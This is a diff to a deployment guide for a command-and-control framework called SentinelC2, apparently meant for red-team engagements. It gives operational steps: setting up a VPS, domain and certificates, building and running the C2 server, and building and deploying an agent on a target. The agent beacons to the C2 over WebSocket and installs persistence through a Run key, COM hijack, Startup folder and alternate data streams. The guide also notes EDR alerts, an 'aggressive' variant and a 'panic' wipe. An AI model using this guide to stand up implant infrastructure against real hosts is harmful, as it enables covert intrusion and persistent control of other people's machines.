@@ -32,7 +32,7 @@ on the target.
 ```
 
 The agent on the target:
-1. Connects to the baked-in C2 URL over WSS
+1. Connects to the baked-in C2 URL over `ws://`; use `wss://` only through an external TLS terminator
 2. Performs the registration handshake (HMAC-authenticated)
 3. Sets up the session crypto (AES-256-GCM)
 4. Installs non-elevated persistence (Run key, COM hijack, Startup folder, ADS backup)
@@ -55,7 +55,7 @@ You need:
   - Open TCP 8443 inbound
 - **A domain name** pointing to the C2 server (e.g. `c2.yourdomain.com`)
   - The agent connects to `wss://c2.yourdomain.com:8443` — no IP literals
-- **A TLS certificate** for that domain (PEM format)
+- **A TLS certificate** for that domain only when an external TLS terminator fronts the plain WebSocket listener
   - Let's Encrypt via acme.sh: `acme.sh --issue -d c2.yourdomain.com --standalone`
   - Or use a self-signed cert (works, but adds `untrusted CA` alerts in EDR)
 
@@ -72,7 +72,8 @@ $env:NIM = "D:\appdata\nim-2.2.10\bin\nim.exe"
 
 This guide assumes you already have a VPS reachable from the target.
 For SentinelC2 the C2 server is `c2_server.nim` — a Nim program that
-listens on TCP 8443 (WSS) and serves the operator dashboard on 8080.
+listens on TCP 8443 as plain WebSocket and serves the operator dashboard
+on 8080. Put a reverse proxy/TLS terminator in front of 8443 for `wss://`.
 
 ### 1.1 — Install the C2 server build deps on the VPS
 
@@ -90,26 +91,24 @@ acme.sh --install-cert -d c2.yourdomain.com \
 ```
 
 Copy the **leaf cert** (`/etc/ssl/c2.crt`) and the **fullchain**
-(`/etc/ssl/c2.fullchain.pem`) to the operator machine — you'll need
-both:
-- The fullchain for the **server** (WSS endpoint cert)
-- The leaf cert for the **agent** (pinned at build time)
+(`/etc/ssl/c2.fullchain.pem`) to the operator machine:
+- The fullchain configures the external TLS terminator
+- The leaf cert can be pinned in the Sentinel build
 
 ### 1.3 — Build and run the C2 server on the VPS
 
-```bash
-# On the VPS, after copying the certs
-nim c -d:release -d:ssl --opt:size --app:console \
-    --passL:-lws2_32 --passL:-lssl --passL:-lcrypto \
-    -o c2_server c2_server.nim
+```powershell
+# Build on the Windows operator machine
+.\build.ps1
 
 # Run it (foreground for first test)
-SSL_CERT=/etc/ssl/c2.fullchain.pem \
-SSL_KEY=/etc/ssl/c2.key \
-WEB_AUTH_USER=operator \
-WEB_AUTH_PASSWORD='YOUR_STRONG_PASSWORD' \
-./c2_server
+$env:C2_WEB_USER = "operator"
+$env:C2_WEB_PASSWORD = "YOUR_STRONG_PASSWORD"
+.\build\c2_server.exe
 ```
+
+The Nim server does not load `SSL_CERT` or `SSL_KEY`; terminate TLS in
+the reverse proxy when the agent must use `wss://`.
 
 For a deploy scenario, run it in a tmux/screen session or as a
 systemd service. The C2 server logs every connection to stdout.
@@ -118,7 +117,7 @@ systemd service. The C2 server logs every connection to stdout.
 
 From a different machine (or your operator laptop):
 ```bash
-curl -k https://c2.yourdomain.com:8080
+curl -k http://c2.yourdomain.com:8080
 # Should show the operator login page
 ```
 
@@ -134,13 +133,10 @@ target.
 The agent and the C2 server share a secret used for the registration
 handshake. It must match in both binaries.
 
-The default is `sentinel-engagement-q4-2026-echo-tango-whiskey` (a
-string the baseline ships with for testing). For a real deployment
-you should rotate it.
-
-To rotate: edit the `S_AGENT_SECRET` const in `agent.nim` AND
-`S_SECRET` in `c2_server.nim` to the same new value, then rebuild
-both. The hardened agent's const is in `hardened/agent_hardened.nim`.
+Use a per-engagement passphrase. Set the same `C2_AGENT_PASSPHRASE`
+before building the server and the agent. The build scripts generate
+`secret.nim`; `build_sentinel.ps1 -Passphrase` affects only Sentinel,
+not the server.
 
 ### 2.2 — Build the deployable
 
@@ -377,10 +373,10 @@ removing the features.
 | Action | Command |
 |---|---|
 | Build the deployable | `.\build_deploy.ps1 -C2Url "wss://..." -CertFile "..." -Variant aggressive` |
-| Build the C2 server | `nim c -d:release -d:ssl c2_server.nim` |
-| Run the C2 server (foreground) | `./c2_server` (with SSL_CERT/SSL_KEY env vars) |
+| Build the C2 server | `.\build.ps1` |
+| Run the C2 server (foreground) | `$env:C2_WEB_USER=...; $env:C2_WEB_PASSWORD=...; .\build\c2_server.exe` |
 | Deploy on target (single command) | `X:\path\agent.exe` |
-| Verify agent registered | `curl -k https://c2.yourdomain.com:8080` |
+| Verify agent registered | `curl -k http://c2.yourdomain.com:8080` |
 | Stop the agent + wipe | From C2: `panic` |
 
 ---
@@ -401,7 +397,7 @@ You might be running an older version of the hardened module. Run
 `hardened/`.
 
 **Agent runs but doesn't register on C2**
-- Check `agent.exe` log at `%TEMP%\svc-X7K.log` on the target
+- Check the agent log at `%TEMP%\csp-<BuildPrefix>.dat` on the target
 - Verify DNS resolves the C2 host from the target
 - Check that TCP 8443 is open inbound on the C2 server's firewall
 - Verify the C2 server is running and listening (look for "listening
